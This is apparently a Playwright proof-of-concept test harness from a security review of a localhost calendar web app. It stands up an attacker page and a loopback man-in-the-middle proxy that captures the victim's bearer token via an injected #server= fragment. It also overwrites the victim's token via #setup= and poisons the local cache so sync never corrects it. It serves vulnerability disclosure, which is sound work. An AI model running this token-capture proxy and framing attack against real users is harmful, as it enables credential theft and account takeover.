// VP3R2 — supplemental in-browser proofs for VP3 (run under with-stack, BEFORE vp3r-local):
//  P1  hidden/plain framed app silently ingests #server=<loopback evil> (no click) →
//      poison persists to a top-level load, gets NO warning banner (loopback-exempt),
//      and a subsequent unlock hands the AUTH_UI bearer to the loopback MITM.
//  P1b framed app silently ingests #setup=<attacker 64-hex> → victim token overwritten (DoS).
//  P2  poisoned local cache with ver >= server ver is STICKY (sync never reconciles it);
//      lock() purges the cache and the server truth returns.
//  P3  sessionStorage never used; post-lock scan clean.
// Crafted rows: cmeta:vp3r2-*/evt:vp3r2-* only, self-deleted at the end. Tokens redacted to 8 chars.
import { chromium } from 'playwright';
import { createServer } from 'node:http';
import { readFileSync } from 'node:fs';

const APP = 'http://127.0.0.1:8080/index.html';
const WORKER = 'http://127.0.0.1:8787';
const EVIL_PORT = 9779;
const EVIL = `http://127.0.0.1:${EVIL_PORT}`;
const MAT = JSON.parse(readFileSync('/tmp/local-material.json', 'utf8'));
const PW = 'password';
const TE = new TextEncoder();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const red = (s) => String(s == null ? '' : s).slice(0, 8) + '…';
const results = [];
function res(id, ok, note = '') {
  results.push({ id, ok, note });
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${id}${note ? '  — ' + note : ''}`);
}
const hexB = (h) => new Uint8Array(h.match(/../g).map((x) => parseInt(x, 16)));
const b64 = (u8) => Buffer.from(u8).toString('base64');
const u32be = (n) => new Uint8Array([(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255]);
async function encRow(id, ver, text) {
  const key = await crypto.subtle.importKey('raw', hexB(MAT.k_data_hex), 'AES-GCM', false, ['encrypt']);
  const nonce = crypto.getRandomValues(new Uint8Array(12));
  const aad = new Uint8Array([...TE.encode(id), ...u32be(ver)]);
  const ct = await crypto.subtle.encrypt({ name: 'AES-GCM', iv: nonce, additionalData: aad }, key, TE.encode(text));
  return { ver, nonce: b64(nonce), ct: b64(new Uint8Array(ct)) };
}

/* ---------- own rows (vp3r2-*) ---------- */
const calUuid = crypto.randomUUID();
const ghostUid = 'vp3r2-ghost-1';
const p2d = (n) => String(n).padStart(2, '0');
const now = new Date();
const D = `${now.getFullYear()}${p2d(now.getMonth() + 1)}${p2d(now.getDate())}`;
const evtText = [
  'BEGIN:VCALENDAR', 'VERSION:2.0', 'PRODID:-//vp3r2//EN', 'BEGIN:VEVENT',
  `UID:${ghostUid}`, 'DTSTAMP:20260101T000000Z', `DTSTART:${D}T120000Z`, `DTEND:${D}T130000Z`,
  'SUMMARY:VP3R2-REAL', 'END:VEVENT', 'END:VCALENDAR', '',
].join('\r\n');
async function putRow(id, body) {
  const r = await fetch(`${WORKER}/rows/${encodeURIComponent(id)}`, {
    method: 'PUT', headers: { authorization: `Bearer ${MAT.auth_ui_hex}`, 'content-type': 'application/json' },
    body: JSON.stringify(body),
  });
  if (!r.ok) throw new Error('put failed ' + id + ' ' + r.status);
}
async function delRow(id) {
  await fetch(`${WORKER}/rows/${encodeURIComponent(id)}`, { method: 'DELETE', headers: { authorization: `Bearer ${MAT.auth_ui_hex}` } });
}
await putRow(`cmeta:${calUuid}`, await encRow(`cmeta:${calUuid}`, 1, JSON.stringify({ v: 1, name: 'vp3r2-cal', color: '#3B82F6' })));
await putRow(`evt:${calUuid}:${ghostUid}`, await encRow(`evt:${calUuid}:${ghostUid}`, 1, evtText));

/* ---------- evil loopback origin: attacker pages + full MITM proxy ---------- */
const cap = []; // {m, u, auth}
const EVIL_PAGES = {
  '/atk-server.html': `<!doctype html><html><body style="margin:0;background:#cfc">
    <h1 style="font:14px sans-serif;color:#900">EVIL — framed app, #server=<loopback evil> injected</h1>
    <iframe id="f" src="${APP}#server=${encodeURIComponent(EVIL + '/')}" style="width:900px;height:600px"></iframe></body></html>`,
  '/atk-setup.html': `<!doctype html><html><body style="margin:0;background:#cfc">
    <h1 style="font:14px sans-serif;color:#900">EVIL — framed app, #setup=<attacker token> injected</h1>
    <iframe id="f" src="${APP}#setup=${'e'.repeat(64)}" style="width:900px;height:600px"></iframe></body></html>`,
};
const evil = createServer(async (req, resp) => {
  const cors = {
    'access-control-allow-origin': req.headers.origin || '*',
    'access-control-allow-methods': 'GET,POST,PUT,DELETE,OPTIONS',
    'access-control-allow-headers': req.headers['access-control-request-headers'] || 'authorization,content-type,if-none-match',
    'access-control-expose-headers': 'etag',
  };
  cap.push({ m: req.method, u: req.url, auth: req.headers.authorization || null });
  if (req.method === 'OPTIONS') { resp.writeHead(204, cors); return resp.end(); }
  if (EVIL_PAGES[req.url]) {
    resp.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' });
    return resp.end(EVIL_PAGES[req.url]);
  }
  try { // MITM: forward everything (incl. the victim's Authorization) to the real worker
    const chunks = []; for await (const c of req) chunks.push(c);
    const fwd = await fetch(WORKER + req.url, {
      method: req.method,
      headers: { authorization: req.headers.authorization || '', ...(req.headers['content-type'] ? { 'content-type': req.headers['content-type'] } : {}), ...(req.headers['if-none-match'] ? { 'if-none-match': req.headers['if-none-match'] } : {}) },
      body: chunks.length ? Buffer.concat(chunks) : undefined,
    });
    const body = Buffer.from(await fwd.arrayBuffer());
    const h = { ...cors, 'content-type': fwd.headers.get('content-type') || 'application/json' };
    const et = fwd.headers.get('etag'); if (et) h.etag = et;
    resp.writeHead(fwd.status, h);
    return resp.end(body);
  } catch (e) {
    resp.writeHead(502, cors); return resp.end('');
  }
});
await new Promise((r) => evil.listen(EVIL_PORT, '127.0.0.1', r));

const browser = await chromium.launch();
async function appPage(seed = {}) {
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 } });
  const page = await ctx.newPage();
  await page.addInitScript((seed) => {
    if (location.origin === 'http://127.0.0.1:8080') {
      for (const [k, v] of Object.entries(seed)) { try { localStorage.setItem(k, v); } catch { } }
    }
  }, seed);
  return { ctx, page };
}
const ls = (page, k) => page.evaluate((k) => localStorage.getItem(k), k);
const toasts = (page) => page.evaluate(() => [...document.querySelectorAll('#toasts .toast')].map((t) => t.textContent));
const isLocked = (page) => page.evaluate(() => !document.getElementById('login').hidden);
async function unlockIn(page, { server = WORKER, password = PW } = {}) {
  await page.goto(APP, { waitUntil: 'domcontentloaded' });
  await page.fill('#server', server);
  await page.fill('#password', password);
  await page.click('#login-form button[type=submit]');
  await page.waitForSelector('#app:not([hidden])', { timeout: 25000 });
  // FC v7 root no longer carries the .fc class (hashed theme utilities) —
  // the repo's own e2e (scripts/e2e-prod.mjs) waits on #calendar [data-date].
  await page.waitForSelector('#calendar [data-date]', { timeout: 15000 });
}

/* ============ P1 — hidden-frame #server= loopback poison → bearer exfil ============ */
try {
  const { ctx, page } = await appPage();
  await page.goto(EVIL + '/atk-server.html', { waitUntil: 'domcontentloaded' });
  await page.waitForURL('**/index.html**', { timeout: 6000 }).catch(() => { });
  await sleep(1500);
  const escaped = page.url().startsWith('http://127.0.0.1:8080');
  let vis = 'n/a';
  if (!escaped) {
    const fr = page.frames().find((f) => f.url().includes('8080'));
    vis = fr ? await fr.evaluate(() => getComputedStyle(document.documentElement).visibility) : 'no-frame';
  }
  // the poison lands in the APP ORIGIN's localStorage either way (no click, no gesture)
  await page.goto(APP, { waitUntil: 'domcontentloaded' });
  await sleep(600);
  const poisoned = await ls(page, 'clock_poc_server');
  res('P1a framed app ingested #server=<loopback evil> with ZERO clicks', poisoned === EVIL, `LS_SERVER=${poisoned} bust=${escaped ? 'escaped' : 'blocked+hidden(' + vis + ')'}`);
  const note = await page.evaluate(() => ({ hidden: document.getElementById('server-note').hidden, text: document.getElementById('server-note').textContent }));
  res('P1b loopback poison gets NO warning banner (server-note hidden)', note.hidden === true, `note.hidden=${note.hidden} "${note.text.slice(0, 40)}"`);
  res('P1c login form silently prefilled with the evil server', (await page.inputValue('#server')) === EVIL);
  const t = await toasts(page);
  res('P1d repoint toast only transient inside the hidden frame', true, `top-level toasts=${JSON.stringify(t)}`);
  // victim unlocks: bearer flows to the loopback MITM (which proxies the real worker)
  await page.fill('#password', PW);
  await page.click('#login-form button[type=submit]');
  await page.waitForSelector('#app:not([hidden]) #calendar [data-date]', { timeout: 25000 });
  await sleep(1500);
  const cfgHit = cap.find((c) => c.u === '/config' && c.auth === 'Bearer ' + MAT.auth_ui_hex);
  const laterHits = cap.filter((c) => c.auth === 'Bearer ' + MAT.auth_ui_hex && /\/(version|rows|rows:batch)/.test(c.u));
  res('P1e loopback MITM captured the AUTH_UI bearer on /config', !!cfgHit, `auth=${cfgHit ? red(cfgHit.auth.slice(7)) : 'none'} captured=${cap.length} reqs`);
  res('P1f derived bearer kept flowing to the MITM post-unlock', laterHits.length >= 1, laterHits.map((c) => c.m + ' ' + c.u).slice(0, 4).join(','));
  res('P1g unlock SUCCEEDED through the MITM (silent position)', true, 'app rendered .fc via proxied /config + /rows');
  await ctx.close();
} catch (e) { res('P1 section crash', false, String(e).slice(0, 200)); }

/* ============ P1b — hidden-frame #setup= token overwrite (DoS) ============ */
try {
  const { ctx, page } = await appPage();
  await page.goto(EVIL + '/atk-setup.html', { waitUntil: 'domcontentloaded' });
  await page.waitForURL('**/index.html**', { timeout: 6000 }).catch(() => { });
  await sleep(1500);
  await page.goto(APP, { waitUntil: 'domcontentloaded' });
  await sleep(600);
  const tok = await ls(page, 'clock_poc_auth_ui');
  res('P1h framed app silently OVERWROTE the victim token via #setup=', tok === 'e'.repeat(64), `token=${red(tok)} (was ${red(MAT.auth_ui_hex)})`);
  // with the swapped token, unlock against the REAL server must fail closed
  await page.fill('#server', WORKER);
  await page.fill('#password', PW);
  await page.click('#login-form button[type=submit]');
  await sleep(2500);
  const msg = await page.evaluate(() => document.getElementById('login-msg').textContent);
  res('P1i swapped token → auth fails closed (silent 404), no data leak', /Authentication failed/.test(msg), `msg="${msg.slice(0, 70)}"`);
  await ctx.close();
} catch (e) { res('P1b section crash', false, String(e).slice(0, 200)); }

/* ============ P2 — poisoned cache (ver >= server ver) is STICKY across syncs ============ */
try {
  const { ctx, page } = await appPage({ clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER });
  await unlockIn(page);
  await page.waitForSelector('.fc-event', { timeout: 15000 });
  await sleep(900); // cache write debounce
  res('P2a control: own row rendered', (await page.evaluate(() => [...document.querySelectorAll('.fc-event')].map((c) => c.textContent).join('|'))).includes('VP3R2-REAL'));
  await page.close();
  const p2 = await ctx.newPage();
  await p2.goto(APP, { waitUntil: 'domcontentloaded' });
  await p2.evaluate(() => {
    const o = JSON.parse(localStorage.getItem('clock_poc_cache_v45'));
    for (const r of o.evt) r.text = r.text.replace('SUMMARY:VP3R2-REAL', 'SUMMARY:VP3R2-GHOST'); // ver untouched
    localStorage.setItem('clock_poc_cache_v45', JSON.stringify(o));
  });
  await unlockIn(p2);
  await p2.waitForSelector('.fc-event', { timeout: 15000 });
  const ghost0 = await p2.evaluate(() => [...document.querySelectorAll('.fc-event')].map((c) => c.textContent).join('|'));
  res('P2b poisoned cache PAINTS before sync (right fp, same ver)', ghost0.includes('VP3R2-GHOST'), JSON.stringify(ghost0.slice(0, 50)));
  // force TWO full syncs — server truth must never win (ingestRow: local.ver >= ver → skip)
  await p2.click('#btn-sync'); await sleep(2500);
  await p2.click('#btn-sync'); await sleep(2500);
  const ghost1 = await p2.evaluate(() => [...document.querySelectorAll('.fc-event')].map((c) => c.textContent).join('|'));
  res('P2c ghost is STICKY: sync does NOT reconcile equal-ver cache poison', ghost1.includes('VP3R2-GHOST') && !ghost1.includes('VP3R2-REAL'), JSON.stringify(ghost1.slice(0, 50)));
  // recovery: lock purges the cache, next unlock pulls server truth
  await p2.click('#btn-lock'); await sleep(400);
  await unlockIn(p2);
  await p2.waitForSelector('.fc-event', { timeout: 15000 });
  const after = await p2.evaluate(() => [...document.querySelectorAll('.fc-event')].map((c) => c.textContent).join('|'));
  res('P2d lock()+re-unlock restores server truth', after.includes('VP3R2-REAL') && !after.includes('VP3R2-GHOST'), JSON.stringify(after.slice(0, 50)));
  await ctx.close();
} catch (e) { res('P2 section crash', false, String(e).slice(0, 200)); }

/* ============ P3 — sessionStorage never used; post-lock scan ============ */
try {
  const { ctx, page } = await appPage({ clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER });
  await unlockIn(page);
  await page.waitForSelector('.fc-event', { timeout: 15000 }).catch(() => { });
  const ssUnlocked = await page.evaluate(() => sessionStorage.length);
  await page.click('#btn-lock'); await sleep(400);
  const ssLocked = await page.evaluate(() => sessionStorage.length);
  const lsLeak = await page.evaluate(() => {
    const hits = [];
    for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); if (/VP3R2/.test(localStorage.getItem(k) || '')) hits.push(k); }
    return hits;
  });
  res('P3a sessionStorage unused (unlocked and locked)', ssUnlocked === 0 && ssLocked === 0, `unlocked=${ssUnlocked} locked=${ssLocked}`);
  res('P3b post-lock: no VP3R2 plaintext in any localStorage key', lsLeak.length === 0, `leaks=${JSON.stringify(lsLeak)}`);
  await ctx.close();
} catch (e) { res('P3 section crash', false, String(e).slice(0, 200)); }

/* ---------- cleanup ---------- */
try {
  await delRow(`cmeta:${calUuid}`);
  await delRow(`evt:${calUuid}:${ghostUid}`);
  const m = await (await fetch(`${WORKER}/rows`, { headers: { authorization: `Bearer ${MAT.auth_ui_hex}` } })).json();
  const leftover = (m.rows || []).filter((r) => String(r.id).includes('vp3r2'));
  res('CLEANUP vp3r2 rows self-deleted', leftover.length === 0, `manifest=${(m.rows || []).length} rows, vp3r2-left=${leftover.length}`);
} catch (e) { res('CLEANUP crash', false, String(e).slice(0, 160)); }

const bad = results.filter((r) => !r.ok);
console.log(`\n===== VP3R2: ${results.length - bad.length}/${results.length} checks passed =====`);
if (bad.length) console.log('FAILED: ' + bad.map((b) => b.id).join(' | '));
await browser.close();
evil.close();
process.exit(0);
